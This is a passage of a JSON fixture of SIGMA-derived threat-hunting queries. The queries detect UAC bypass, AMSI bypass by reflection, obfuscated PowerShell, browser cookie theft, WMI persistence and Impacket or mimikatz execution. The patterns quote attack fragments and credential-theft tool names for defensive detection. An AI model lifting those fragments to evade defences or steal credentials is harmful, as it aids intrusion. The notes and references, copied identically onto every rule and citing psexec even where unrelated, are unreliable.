-n \") or (tgt.process.image.path contains \"\\PING.EXE\" and src.process.cmdline contains \"\\DismFoDInstall.cmd\") or src.process.image.path contains \":\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\" or ((src.process.image.path contains \":\\Program Files (x86)\\Java\\\" or src.process.image.path contains \":\\Program Files\\Java\\\") and src.process.image.path contains \"\\bin\\javaws.exe\" and (tgt.process.image.path contains \":\\Program Files (x86)\\Java\\\" or tgt.process.image.path contains \":\\Program Files\\Java\\\") and tgt.process.image.path contains \"\\bin\\jp2launcher.exe\" and tgt.process.cmdline contains \" -ma \")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 503
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the installation of VsCode tunnel (code-tunnel) as a service.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Visual Studio Code Tunnel Service Installation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"tunnel \" and tgt.process.cmdline contains \"service\" and tgt.process.cmdline contains \"internal-run\" and tgt.process.cmdline contains \"tunnel-service.log\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 504
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using Disk Cleanup",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\\"\\system32\\cleanmgr.exe /autoclean /d C:\" and src.process.cmdline=\"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 505
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential commandline obfuscation using known escape characters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140"
            ],
            "name": "Potential Commandline Obfuscation Using Escape Characters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"h^t^t^p\" or tgt.process.cmdline contains \"h\\\"t\\\"t\\\"p\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 506
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048"
            ],
            "name": "Suspicious Redirection to Local Admin Share",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \">\" and (tgt.process.cmdline contains \"\\\\127.0.0.1\\admin$\\\" or tgt.process.cmdline contains \"\\\\localhost\\admin$\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 507
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation COMPRESS OBFUSCATION",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"new-object\" and tgt.process.cmdline contains \"text.encoding]::ascii\") and (tgt.process.cmdline contains \"system.io.compression.deflatestream\" or tgt.process.cmdline contains \"system.io.streamreader\" or tgt.process.cmdline contains \"readtoend(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 508
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This rule detects the execution of Run Once task as configured in the registry",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Run Once Task Execution as Configured in Registry",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\runonce.exe\" or tgt.process.displayName=\"Run Once Wrapper\") and (tgt.process.cmdline contains \"/AlternateShellStartup\" or tgt.process.cmdline contains \"/r\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 509
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1021"
            ],
            "name": "Remote PowerShell Session Host Process (WinRM)",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wsmprovhost.exe\" or src.process.image.path contains \"\\wsmprovhost.exe\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 510
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Rundll32 Activity Invoking Sys File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"rundll32.exe\" and (tgt.process.cmdline contains \".sys,\" or tgt.process.cmdline contains \".sys \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 511
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Potential AMSI Bypass Via .NET Reflection",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"System.Management.Automation.AmsiUtils\" and tgt.process.cmdline contains \"amsiInitFailed\") or (tgt.process.cmdline contains \"[Ref].Assembly.GetType\" and tgt.process.cmdline contains \"SetValue($null,$true)\" and tgt.process.cmdline contains \"NonPublic,Static\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 512
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects WMI script event consumers",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "WMI Persistence - Script Event Consumer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path=\"C:\\WINDOWS\\system32\\wbem\\scrcons.exe\" and src.process.image.path=\"C:\\Windows\\System32\\svchost.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 513
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1539",
                "t1005"
            ],
            "name": "SQLite Firefox Profile Data DB Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName=\"SQLite\" or (tgt.process.image.path contains \"\\sqlite.exe\" or tgt.process.image.path contains \"\\sqlite3.exe\")) and (tgt.process.cmdline contains \"cookies.sqlite\" or tgt.process.cmdline contains \"places.sqlite\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 514
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1185"
            ],
            "name": "Potential Data Stealing Via Chromium Headless Debugging",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"--remote-debugging-\" and tgt.process.cmdline contains \"--user-data-dir\" and tgt.process.cmdline contains \"--headless\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 515
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the SysInternals Procdump utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "Procdump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\procdump.exe\" or tgt.process.image.path contains \"\\procdump64.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 516
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1204",
                "t1218"
            ],
            "name": "Suspicious WmiPrvSE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\wbem\\WmiPrvSE.exe\" and ((tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\verclsid.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"pwsh\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"wscript\"))) and (not (tgt.process.image.path contains \"\\WerFault.exe\" or tgt.process.image.path contains \"\\WmiPrvSE.exe\" or (tgt.process.image.path contains \"\\msiexec.exe\" and tgt.process.cmdline contains \"/i \")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 517
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Child Process Of Veeam Dabatase",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\sqlservr.exe\" and src.process.cmdline contains \"VEEAMSQL\") and (((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\wt.exe\") and (tgt.process.cmdline contains \"-ex \" or tgt.process.cmdline contains \"bypass\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"DownloadString\" or tgt.process.cmdline contains \"http://\" or tgt.process.cmdline contains \"https://\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"copy \")) or (tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\tasklist.exe\" or tgt.process.image.path contains \"\\whoami.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 518
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1557"
            ],
            "name": "HackTool - Impacket Tools Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\goldenPac\" or tgt.process.image.path contains \"\\karmaSMB\" or tgt.process.image.path contains \"\\kintercept\" or tgt.process.image.path contains \"\\ntlmrelayx\" or tgt.process.image.path contains \"\\rpcdump\" or tgt.process.image.path contains \"\\samrdump\" or tgt.process.image.path contains \"\\secretsdump\" or tgt.process.image.path contains \"\\smbexec\" or tgt.process.image.path contains \"\\smbrelayx\" or tgt.process.image.path contains \"\\wmiexec\" or tgt.process.image.path contains \"\\wmipersist\") or (tgt.process.image.path contains \"\\atexec_windows.exe\" or tgt.process.image.path contains \"\\dcomexec_windows.exe\" or tgt.process.image.path contains \"\\dpapi_windows.exe\" or tgt.process.image.path contains \"\\findDelegation_windows.exe\" or tgt.process.image.path contains \"\\GetADUsers_windows.exe\" or tgt.process.image.path contains \"\\GetNPUsers_windows.exe\" or tgt.process.image.path contains \"\\getPac_windows.exe\" or tgt.process.image.path contains \"\\getST_windows.exe\" or tgt.process.image.path contains \"\\getTGT_windows.exe\" or tgt.process.image.path contains \"\\GetUserSPNs_windows.exe\" or tgt.process.image.path contains \"\\ifmap_windows.exe\" or tgt.process.image.path contains \"\\mimikatz_windows.exe\" or tgt.process.image.path contains \"\\netview_windows.exe\" or tgt.process.image.path contains \"\\nmapAnswerMachine_windows.exe\" or tgt.process.image.path contains \"\\opdump_windows.exe\" or tgt.process.image.path contains \"\\psexec_windows.exe\" or tgt.process.image.path contains \"\\rdp_check_windows.exe\" or tgt.process.image.path contains \"\\sambaPipe_windows.exe\" or tgt.process.image.path contains \"\\smbclient_windows.exe\" or tgt.process.image.path contains \"\\smbserver_windows.exe\" or tgt.process.image.path contains \"\\sniff_windows.exe\" or tgt.process.image.path contains \"\\sniffer_windows.exe\" or tgt.process.image.path contains \"\\split_windows.exe\" or tgt.process.image.path contains \"\\ticketer_windows.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 519
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
